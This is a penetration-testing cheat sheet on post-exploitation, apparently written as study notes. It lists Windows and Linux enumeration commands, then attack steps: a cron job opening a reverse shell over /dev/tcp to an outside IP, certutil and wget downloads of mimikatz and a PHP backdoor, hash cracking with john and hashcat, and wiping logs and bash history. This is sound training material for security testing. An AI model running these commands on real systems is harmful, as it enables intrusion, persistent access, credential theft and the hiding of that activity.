# POST Exploitation

[Back](../index.md)

-- -

Post-exploitation is the final phase of the penetration testing process and consists of the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.


Post Exploitation Methodology
1. Local Enumeration
2. Transferring Files
3. Upgrading shells
4. Privilege Escalation
5. Persistence
6. Dumping and Cracking Hashes
7. Pivoting
8. Clearning Tracks

## Windows : Enumerating system information

Information to gather:
+ Hostname
+ OS Name (Windows 7, 8 etc)
+ OS Build & Service Pack (Windows 7 SP1 7600)
+ OS Architecture (x64/x86)
+ Installed updates/Hotfixes

In meterpreter session : ```sysinfo```, ```getuid```
In shell : ```hostname``` , ```systeminfo``` , ```wmic qfe get Caption,Description,HotfixID,InstalledOn```

## Windows : Enumerating groups and users

Information to gather
+ Current user & privileges
+ Additional user information
+ Other users on the system
+ Groups
+ Members of the built-in administrator group

In meterpreter session : ```getuid``` , ```getprivs``` , 

windows/gather/enum_logged_on_users : Enumerate previously logged in users.

In shell : ```whoami```, ```whoami /priv``` , ```query user``` , ```net users``` ```net users username```, ```net localgroup```, ```net localgroup administrator```, 

## Windows : Enumerating network information

Information to gather:
+ Current IP address & network adapter
+ Internal networks
+ TCP/UDP services running and their respective ports
+ Other hosts on the network
+ Routing table
+ Windows Firewall state

In shell : ```ipconfig``` , ```ipconfig /all```, ```route print```, ```arp -a```, ```netstat -ano```, ```netsh firewall show state``` , ```netsh advfirewall state```, 


## Windows : Enumerating process and services 

Information to gather
+ Running processes & services
+ Scheduled tasks

Process vs Service
- A process is an instance of a running executable (.exe) or program.
- A service is a process which runs in the background and does not interact with the desktop.

In meterpreter session : ```ps``` , ```pgrep service_name``` , ```migrate process_id```

In shell : ```net start```, ```wmic service list brief```, ```tasklist /SVC```, ```schtasks /query /fo LIST```


post/windows/gather/win_privs : Enumerating privilege
post/windows/gather/enum_logged_on_users : Enumerate logged on users
post/windows/gather/checkvm : Check if machine is VM
post/windows/gather/enum_applications : Enumerate installed application
post/windows/gather/enum_computers : Enumerate computers in domain
post/windows/gather/enum_patches : Enumerate patches
post/windows/gather/enum_shares : Enumerate shares


JAWS - Just Another Windows (Enum) Script - JAWS is PowerShell script 
designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.

GitHub Repo: https://github.com/411Hall/JAWS


## Linux : Enumerating system information

Information to gather:
+ Hostname
+ Distribution & distribution release version
+ Kernel version & architecture
+ CPU information
+ Disk information & mounted drives
+ Installed packages/software

In meterpreter session: ```sysinfo```, 

In shell: hostname , ```cat /etc/issue``` , ```cat /etc/*release```, ```uname -r```, ```env``` , ```lscpu```, ```df -h```, ```lsblk```, ```dpkg -l```, ```apt list installed```

## Linux : Enumerating groups and users

Information to gather:
+ Current user & privileges
+ Other users on the system
+ Groups

In meterpreter session : ```getuid```, 

In shell : ```whoami```, ```groups username```, ```cat /etc/passwd```, ```groups```, ```w``` , ```who``` , ```last```, ```lastlog```

## Linux : Enumerating network infromation

Information to gather:
+ Current IP address & network adapter
+ Internal networks
+ TCP/UDP services running and their respective ports
+ Other hosts on the network

In meterpreter : ```ifconfig``` , ```netstat```, ```route```, ```apr```

In shell : ```ip a s``` , ```cat /etc/network``` , ```cat /etc/hostname```, ```cat /etc/hosts```, ```cat /etc/resolv.conf```, ```arp -a```

## Linux : Enumerating processes and cronjobs

Information to gather:
+ Running services
+ Cron Jobs

In meterpreter : ```ps``` , ```pgrep service_name``` 

In shell : ```ps``` , ```ps aux``` , ```top``` , ```crontab -l```  , ```ls -al /etc/cron*``` , ```cat /etc/cron*```


LinEnum - LinEnum is a simple bash script that automates common Linux 
local enumeration checks in addition to identifying privilege escalation 
vulnerabilities.


post/linux/gather/enum_configs : Enumerate configurations
post/linux/gather/enum_network : Enumerate network information
post/linux/gather/enum_system : Enumerate system information

GitHub Repo: https://github.com/rebootuser/LinEnum

-- -

## Transfer Files to target system

Using meterpreter session : Upload command

Setup webserver using python:
- python 2 : python -m SimpleHTTPServer 80
- python 3 : python3 -m http.server 80

To dowload file on windows:
```certutil -urlcache -f http://URL/mimikatz.exe mimikatz.exe```

To download file on linux:
```wget http://URL/php-backdoor.php```


-- -

## Upgrading non interactive shell

cat /etc/shells to get list of installed shell
If python is installed ```python -c 'import pty;pty.spawn("/bin/bash")'```
If perl is installed ```perl -e 'exec "/bin/bash";```
If ruby is installed ```ruby: exec "/bin/bash"```

export TERM=xterm
export SHELL=bash
export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin

-- -

## Windows Persistence

We require elevated privilege for persistence.

windows/local/persistence_service : Persistence using obscured service 
post/windows/manage/enable_rdp : Persistence via RDP

To add user in windows and run as RDP:
Command in meterpreter : ```run getgui e -u new_username -p password```

Use xfreerdp to login : ```xfreerdp /u:username /p:password /v:ip```

## Linux Persistence

Create ssh key to user and copy private key to system.

If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.

Adding persistence via cronjob : https://attack.mitre.org/techniques/T1053/

Run following commands on system to setup cronjob:
```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.178.177.2/1234 0>&1'" > cron

crontab -i cron

crontab -l
```

-- -

## Dumping and Cracking hashes

### Windows
hashdump using meterpreter session

```
john --format=NT hash.txt
john --format=NT --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
hashcat -a3 -m 1000 --wordlist /usr/share/wordlist/rockyou.txt hash.txt
```
## Linux

```
john --format=sha512 --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
hashcat -a3 -m 1800 --wordlist /usr/share/wordlist/rockyou.txt hash.txt
```

-- -

## Pivot

-- -

## Windows PrviescCheck

PrivescCheck - This script aims to enumerate common Windows 
configuration issues that can be leveraged for local privilege escalation. It 
also gathers various information that might be useful for exploitation 
and/or post-exploitation.
+ GitHub Repo: https://github.com/itm4n/PrivescCheck

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

## Linux Privilege Escalation

Weak permissions sets, find files which have weak permissions
find / -not -type l -perm -o+w 2>/dev/null

Misconfigured suod privilege
sudo -l to list out sudo permission for particular user
gtfobins : https://gtfobins.github.io/gtfobins/man/

-- -

## Clearing tracks on windows

clearev in meterpreter session for windows

On linux to clear bash history 
history -c 
cat /dev/null > ~/.bash_history 

